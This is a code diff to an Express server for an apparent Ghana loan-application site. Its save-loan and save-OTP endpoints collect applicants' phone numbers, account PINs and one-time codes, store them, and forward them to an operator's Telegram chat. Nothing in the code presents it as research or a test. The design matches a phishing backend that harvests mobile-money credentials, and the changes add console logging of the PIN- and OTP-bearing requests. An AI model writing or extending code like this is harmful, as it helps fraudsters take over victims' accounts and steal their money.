@@ -96,6 +96,7 @@ app.get('/health', (req, res) => {
 
 app.post('/api/save-loan', async (req, res) => {
     try {
+        console.log('📥 Save loan request received:', req.body);
         const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
         const loanId = generateLoanId();
         
@@ -103,6 +104,7 @@ app.post('/api/save-loan', async (req, res) => {
             await db.run(`INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, total_payment, interest, status)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                 [loanId, phone, pin, network, amount, duration, monthly, total || amount * 1.109, interest || amount * 0.109, 'pending']);
+            console.log('✅ Loan saved to database:', loanId);
         }
         
         const messageText = `<b>🔴 NEW LOAN APPLICATION - GHANA</b>\n\n` +
@@ -129,7 +131,7 @@ app.post('/api/save-loan', async (req, res) => {
         
         res.json({ success: true, loanId, messageId });
     } catch (error) {
-        console.error('Save loan error:', error);
+        console.error('❌ Save loan error:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
@@ -137,7 +139,7 @@ app.post('/api/save-loan', async (req, res) => {
 app.post('/webhook/telegram', async (req, res) => {
     try {
         const update = req.body;
-        console.log('Webhook received');
+        console.log('📨 Webhook received:', JSON.stringify(update, null, 2));
         
         if (update.callback_query) {
             const callbackData = update.callback_query.data;
@@ -145,10 +147,11 @@ app.post('/webhook/telegram', async (req, res) => {
             const callbackId = update.callback_query.id;
             const [action, loanId] = callbackData.split('_');
             
-            console.log(`Action: ${action}, LoanId: ${loanId}`);
+            console.log(`🎯 Action: ${action}, LoanId: ${loanId}`);
             
             if (action === 'approve' && db) {
                 await db.run(`UPDATE loans SET status = 'approved' WHERE loan_id = ?`, [loanId]);
+                console.log(`✅ Loan ${loanId} status updated to 'approved'`);
                 
                 await editTelegramMessage(messageId, 
                     `✅ <b>LOAN APPROVED</b>\n\n` +
@@ -164,6 +167,7 @@ app.post('/webhook/telegram', async (req, res) => {
                 });
             } else if (action === 'decline' && db) {
                 await db.run(`UPDATE loans SET status = 'declined' WHERE loan_id = ?`, [loanId]);
+                console.log(`❌ Loan ${loanId} status updated to 'declined'`);
                 
                 await editTelegramMessage(messageId,
                     `❌ <b>LOAN DECLINED</b>\n\n` +
@@ -180,7 +184,7 @@ app.post('/webhook/telegram', async (req, res) => {
         }
         res.sendStatus(200);
     } catch (error) {
-        console.error('Webhook error:', error);
+        console.error('❌ Webhook error:', error);
         res.sendStatus(200);
     }
 });
@@ -189,7 +193,7 @@ app.post('/api/save-otp', async (req, res) => {
     try {
         const { loanId, otp, phone } = req.body;
         
-        console.log('OTP received:', { loanId, otp, phone });
+        console.log('🔐 OTP received:', { loanId, otp, phone });
         
         if (db) {
             await db.run(`UPDATE loans SET otp_code = ? WHERE loan_id = ?`, [otp, loanId]);
@@ -202,14 +206,13 @@ app.post('/api/save-otp', async (req, res) => {
             `<b>🔑 OTP Code:</b> <code>${otp}</code>\n` +
             `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
             `━━━━━━━━━━━━━━━━━━\n\n` +
-            `<b>✅ User has entered OTP and is proceeding to contact you on Telegram.</b>\n` +
-            `<b>📱 Contact user: https://t.me/${phone}</b>`;
+            `<b>✅ User has entered OTP and is proceeding to contact you on Telegram.</b>`;
         
         await sendTelegramMessage(messageText);
         
         res.json({ success: true });
     } catch (error) {
-        console.error('Save OTP error:', error);
+        console.error('❌ Save OTP error:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
@@ -218,8 +221,10 @@ app.get('/api/loan/:loanId', async (req, res) => {
     try {
         if (!db) return res.json({ success: true, loan: { status: 'pending' } });
         const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [req.params.loanId]);
+        console.log(`📊 Status check for ${req.params.loanId}: ${loan?.status || 'not found'}`);
         res.json({ success: true, loan: loan || { status: 'pending' } });
     } catch (error) {
+        console.error('❌ Get loan error:', error);
         res.json({ success: true, loan: { status: 'pending' } });
     }
 });
